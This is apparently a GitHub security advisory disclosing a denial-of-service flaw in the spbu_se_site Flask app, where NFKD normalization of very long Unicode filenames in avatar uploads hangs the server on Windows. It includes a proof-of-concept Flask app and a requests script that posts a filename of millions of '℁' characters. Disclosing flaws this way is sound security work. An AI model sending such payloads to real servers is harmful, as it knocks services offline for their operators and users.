# Uploading an image with a specific filename causes a server-side DoS

Moderate

[iakov](/iakov)
published
GHSA-5vfc-v7hg-pvwm
Jan 27, 2024

## Package

pip

spbu\_se\_site
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

v2023.12.04 and below

## Patched versions

None

## Description

### Summary

When uploading an avatar image, an authenticaed user may intentionally use a large Unicode filename which would lead to a server-side

denial of service under Windows. This is due to no limitation of the length of the filename and the costy use of the Unicode normalization with the form NFKD on Windows OS.

### Paths in the Code source

Path with 04 steps

1. [src/flask\_se\_auth.py](https://github.com/spbu-se/spbu_se_site/blob/758a74bb108f527b93f784d8f2d87279b7cf370e/src/flask_se_auth.py#L245C9-L245C13)

   ```
               flash("No file part")
               return redirect(request.url)
           file = request.files["file"]
           # If the user does not select a file, the browser submits an
           # empty file without a filename.

   ```
2. [src/flask\_se\_auth.py](https://github.com/spbu-se/spbu_se_site/blob/758a74bb108f527b93f784d8f2d87279b7cf370e/src/flask_se_auth.py#L252C40-L252C53)

   ```
               return redirect(request.url)
           if file and allowed_file(file.filename):
               filename = secure_filename(file.filename)
               new_filename = os.urandom(16).hex()
               f, ext = os.path.splitext(filename)

   ```
3. [src/flask\_se\_config.py](https://github.com/spbu-se/spbu_se_site/blob/758a74bb108f527b93f784d8f2d87279b7cf370e/src/flask_se_config.py#L64C21-L64C29)

   ```

   def secure_filename(filename: str) -> str:
       if isinstance(filename, text_type):
           from unicodedata import normalize

   ```
4. [src/flask\_se\_config.py](https://github.com/spbu-se/spbu_se_site/blob/758a74bb108f527b93f784d8f2d87279b7cf370e/src/flask_se_config.py#L68C38-L68C46)

   ```
           from unicodedata import normalize

           filename = normalize("NFKD", filename)

       for sep in os.path.sep, os.path.altsep:

   ```
### PoC

Next is a minimalist flask application that reproduces an avatar upload when the user is logged in.

```
from flask import Flask, request, render_template, redirect, url_for
import os
import re

_windows_device_files = (
    "CON",
    "AUX",
    "COM1",
    "COM2",
    "COM3",
    "COM4",
    "LPT1",
    "LPT2",
    "LPT3",
    "PRN",
    "NUL",
)

_filename_strip_re = re.compile(r"[^A-Za-zа-яА-ЯёЁ0-9_.-]")

app = Flask(__name__)

UPLOAD_FOLDER = "uploads"
ALLOWED_EXTENSIONS = {"bmp", "png", "jpg", "jpeg"}

# Ensure the upload folder exists
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

def allowed_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS

def secure_filename(filename: str) -> str:
    if isinstance(filename, str):
        from unicodedata import normalize

        # print("Normalized", filename)
        filename = normalize("NFKD", filename)

    for sep in os.path.sep, os.path.altsep:
        if sep:
            filename = filename.replace(sep, " ")

    filename = str(_filename_strip_re.sub("", "_".join(filename.split()))).strip("._")

    if (
        os.name == "nt"
        and filename
        and filename.split(".")[0].upper() in _windows_device_files
    ):
        filename = "_{filename}"

    return filename

def bypass(filename):
    # Condition 1:
    cond1 = "." in filename and filename.rsplit(".", 1)[1].lower() == "bmp"

    # Condition 2:
    filename = secure_filename(filename)
    _, ext = os.path.splitext(filename)
    cond2 = ext.lower() != ".bmp"
    return cond1 and cond2

@app.route("/", methods=["GET", "POST"])
def upload_file():
    if request.method == "POST":
        # Check if the post request has the file part
        if "file" not in request.files:
            return redirect(request.url)

        file = request.files["file"]

        if bypass(file.filename):
            return f"Bypass successful for file: {file.filename}"
        else:
            return f"Bypass failed for file: {file.filename}"

    return render_template("upload.html")

if __name__ == "__main__":
    app.run(debug=True)
```

Now, consider the following tool that could be run as `python3 posting.py 5000000`

```
import requests
import sys

url = "http://localhost:5000/"  # Adjust the URL accordingly
x = int(sys.argv[1])
files = {"file": ("℁" * x + ".bmp", open("titre.jpg", "rb"))}  # Adjust the file path

response = requests.post(
    url,
    files=files
)

print(response.status_code, response.elapsed.total_seconds())
```

Notice the use of the Unicode character `℁` in the filename as many time as potentially `5_000_000`.

### Impact

* Server-side Denial of server: the web app would hung undefinetly and not process any further requests.

### References:

* similar to [CVE-2023-46695](https://github.com/advisories/GHSA-qmf9-6jqf-j8fq "CVE-2023-46695")

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
